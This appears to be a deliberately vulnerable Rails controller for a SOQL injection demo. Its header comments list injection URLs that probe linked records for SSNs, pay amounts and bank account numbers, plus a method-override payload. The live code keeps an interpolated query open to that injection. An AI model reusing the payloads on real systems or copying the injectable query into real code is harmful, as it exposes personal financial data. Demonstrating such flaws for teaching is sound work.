# SOME QUERIES YOU CAN RUN
# a working query, as intended
# http://0.0.0.0:3000/api/people?account_id=0011U00000DVztTQAT
# pretty generic detection, since all objects are by default created by someone with an email
# http://0.0.0.0:3000/api/people?account_id=' OR CreatedBy.Email like '%25
# let's get some other account names..
# http://0.0.0.0:3000/api/people?account_id=' OR Account.Name like 'G%25
# let's see if we can find an interesting table that's connected
# http://0.0.0.0:3000/api/people?account_id=' OR Client__r.SSN__c like '123%25
# this doesn't work...
# http://0.0.0.0:3000/api/people?account_id=' OR Client__r.Paychex_Stub__r.Amount__c > '100
# this does work!
# http://0.0.0.0:3000/api/people?account_id=' OR Client__r.Paychex_Stub__r.Amount__c > 92125 OR Account.Name like 'grawefawawev%25
# three levels deep
# http://0.0.0.0:3000/api/people?account_id=' OR Client__r.Paychex_Stub__r.Bank_Account__r.Account_Number__c like '9%25
# possible CVE exploit
# http://0.0.0.0:3000/api/people?account_id=0011U00000DVztTQAT%3Fshould_get_paid%3Dtrue%26_HttpMethod%3DPATCH

class API::PeopleController < ApplicationController
    def index
        account_id = params[:account_id]
        print account_id + '\n'
        client = Restforce.new(username: ENV['SALESFORCE_USER'],
                               password: ENV['SALESFORCE_PW'],
                               security_token: ENV['SALESFORCE_SECURITY_TOKEN'],
                               client_id: ENV['SALESFORCE_CLIENT_ID'],
                               client_secret: ENV['SALESFORCE_CLIENT_SECRET'],
                               api_version: '45.0')

        # an exploitable query
        accounts = client.query("select Name, LastModifiedBy.Name from Account where Id = '#{account_id}'")
        account = accounts.first
        print account + '\n'
        render json: account.Name

        # a supposedly safer query
        # supposedlySafeResult = client.find('Account', account_id)
        # render json: supposedlySafeResult.Name
    end
end